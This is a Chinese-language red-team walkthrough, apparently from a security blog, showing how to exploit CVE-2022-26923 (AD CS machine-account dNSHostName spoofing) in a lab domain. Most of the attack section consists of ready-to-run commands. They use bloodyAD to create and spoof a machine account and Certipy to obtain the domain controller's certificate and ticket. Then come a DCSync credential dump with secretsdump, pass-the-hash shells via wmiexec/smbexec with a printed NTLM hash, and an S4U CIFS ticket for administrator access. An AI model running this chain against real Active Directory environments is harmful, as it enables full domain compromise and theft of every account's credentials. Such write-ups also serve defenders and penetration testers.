## 0x01 前言

本文介绍前段时间爆出的CVE-2022–26923 AD
CS域内权限提升漏洞，该漏洞利用难度低，造成危害大，在实战中具有一定的影响力，基于此对该漏洞进行实战测试。

 **漏洞信息：**  
[CVE-2022-26923 - Microsoft - Active Directory Domain Services Elevation of
Privilege Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923)  
[CVE - CVE-2022-26923 (mitre.org)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26923)

 **漏洞原因：**  
由于计算机账户中的dNSHostName不具有唯一性，可以对其进行伪造，冒充高权限的域空机器账户，实现权限提升的效果

 **漏洞利用条件：**

  1. 能够创建机器账户（或拥有某机器账户的控制权）

  2. 对机器账户具有修改属性的权限

  3. 目标未打相应补丁

## 0x02 测试环境

### 环境拓扑图

![OHBw5D.png](https://image.3001.net/images/20220519/1652931759_6285bcafb1e0359e3691e.png!small)

### 环境信息

    
    
    域名: redteam.lab
    域控制器: 
    	操作系统: Windows Server 2016
    	主机名: DC2016
    	IP: 10.10.2.20
    边界主机:
    	操作系统: Windows 10
    	主机名: WIN10-1
    	IP: 10.10.2.100
    攻击机:
    	操作系统: kali Liux
    	IP: 10.10.2.77
    

## 0x03 实战测试

这里假定已经获取到一个入口点（域内主机Windows10）

### Ⅰ. powershell枚举CA名称

在Cobalt Strike中执行下面命令

    
    
    # 列出证书驱动器
    powerpick Get-PSDrive cert | ft -AutoSize
    
    # 列出本地机器账户的证书
    powerpick Get-ChildItem Cert:\LocalMachine\Root\
    

![OHBNb6.png](https://image.3001.net/images/20220519/1652931783_6285bcc738558fe316532.png!small)

### Ⅱ. 创建机器账户

方法一：使用bloodyAD进行创建

    
    
    # 创建机器账户
    python3 bloodyAD.py -d redteam.lab -u ken -p '123.com' --host 10.10.2.20 addComputer CPT01 'Passw0rd'
    
    # 设置dNSHostName
    python3 bloodyAD.py -d redteam.lab -u ken -p '123.com' --host 10.10.2.20 setAttribute 'CN=CPT01,CN=Computers,DC=redteam,DC=lab' DNSHostName '["DC2016.redteam.lab"]'
    

![OHBtDx.png](https://image.3001.net/images/20220519/1652931795_6285bcd385983ddd62afb.png!small)

### Ⅲ. 申请证书

使用[Certipy](https://github.com/ly4k/Certipy)工具申请证书

    
    
    certipy req 'redteam.lab/CPT01$:Passw0rd@DC2016.redteam.lab' -ca 'redteam-DC2016-CA' -template 'Machine'
    

![OHBGvR.png](https://image.3001.net/images/20220519/1652931827_6285bcf365d2604ca814a.png!small)

### Ⅳ. 申请票据

同样使用[Certipy](https://github.com/ly4k/Certipy)工具申请票据

    
    
    certipy auth -pfx dc2016.pfx -username DC2016$ -domain redteam.lab -dc-ip 10.10.2.20
    

![OHBYK1.png](https://image.3001.net/images/20220519/1652931832_6285bcf83d6dfb3bb55cd.png!small)

### Ⅴ. 获取域控Hash

获取到域控机器账户的Hash后，可以执行DCSync攻击

    
    
    KRB5CCNAME=dc2016.ccache python3 secretsdump.py -k redteam.lab/DC2016\$@dc2016.redteam.lab -no-pass -just-dc
    

![OHB829.png](https://image.3001.net/images/20220519/1652931841_6285bd012f306ca474283.png!small)

### Ⅵ. 获取域控权权限

1 使用wmiexec、psexec.py等工具获取域控权权限

    
    
    python3 wmiexec.py -hashes :83a140d89e42046e8daf5394d386a69a redteam.lab/administrator@10.10.2.20 -dc-ip 10.10.2.20
    
    python3 smbexec.py -hashes :83a140d89e42046e8daf5394d386a69a administrator@DC2016.redteam.lab -dc-ip 10.10.2.20
    

![OHBdUO.png](https://image.3001.net/images/20220519/1652931851_6285bd0bb0180887b3a9b.png!small)

2 申请域控CIFS票据访问  
使用到[PKINITtools](https://github.com/dirkjanm/PKINITtools)工具中的gets4uticket.py脚本

    
    
    # 申请票据，保存为Admin.ccache
    python3 gets4uticket.py kerberos+ccache://redteam.lab\\DC2016\$:dc2016.ccache@dc2016.redteam.lab cifs/dc2016.redteam.lab@redteam.lab Administrator@redteam.lab admin.ccache -v
    
    # 使用票据登录
    KRB5CCNAME=admin.ccache python3 smbexec.py -k redteam.lab/administrator@DC2016.redteam.lab -no-pass -dc-ip 10.10.2.20
    

![OHBBPe.png](https://image.3001.net/images/20220519/1652931855_6285bd0f881e9d6c9f340.png!small)

